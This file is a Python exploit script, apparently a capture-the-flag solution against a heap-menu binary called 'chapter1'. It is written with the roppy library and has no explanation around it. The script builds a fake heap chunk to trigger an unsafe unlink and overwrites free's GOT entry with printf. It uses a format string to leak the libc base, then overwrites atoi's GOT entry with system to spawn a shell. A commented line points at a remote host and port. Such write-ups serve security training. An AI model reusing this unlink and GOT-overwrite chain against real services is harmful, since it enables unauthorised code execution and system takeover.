from roppy import *

def allocate(size, data):
	p.sendlineafter(">> ", "1")
	p.sendlineafter(": ", str(size))
	p.sendlineafter(": ", data)


def edit(idx, data):
	p.sendlineafter(">> ", "2")
	p.sendlineafter(": ", str(idx))
	p.sendlineafter(": ", data)


def delete(idx):
	p.sendlineafter(">> ", "3")
	p.sendlineafter(": ", str(idx))

p = process("./chapter1")
#p = remote("64.227.39.186", 30777)
elf = ELF("chapter1")
libc = ELF("/home/vagrant/tools/LibcSearcher/libc-database/db/libc6_2.23-0ubuntu10_amd64.so")


global_ptr = 0x6020c0 
global_ptr += 8 * 3


log.info("Created 5 chunks of size: 0x88")
allocate(0x88, "A"*0x88)
allocate(0x88, "B"*0x88)
allocate(0x88, "C"*0x88)
allocate(0x88, "D"*0x88)
allocate(0x88, "E"*0x88)

log.info("Preparing a fake chunk...")
payload = p64(0x0)*2
payload += p64(global_ptr - 0x18)
payload += p64(global_ptr - 0x10)
payload = payload.ljust(0x80, b"X")
payload += p64(0x80)
payload += b"\x90"
log.info("Fake chunk:\n%s" %(hexdump(payload)))

log.info("Editing chunk 3 with a fakr chunk")
edit(3, payload)

log.info("Triggering Unlink")
delete(4)


log.info("Changing freegot to print@plt for LIBC Leak")
edit(3, p64(elf.got("free")))
edit(0, p64(elf.plt("printf")))

log.info("Getting __libc_start_main")
allocate(0x88, "%15$p")
delete(4)
libc_start_main = int(p.recvline().strip(b"\n"), 16)
log.info("__libc_start_main+240:    0x%x" %(libc_start_main))
libc.address = libc_start_main - 240 - libc.function("__libc_start_main")

log.info("LIBC                 :    0x%x" %(libc.address))

system = p64(libc.function("system"))
#system = system.replace(b"\x7f", b"\x16\x7f")
edit(3, p32(elf.got("atoi")))
edit(0, system)

p.sendafter(">> ", "sh")
p.interactive()
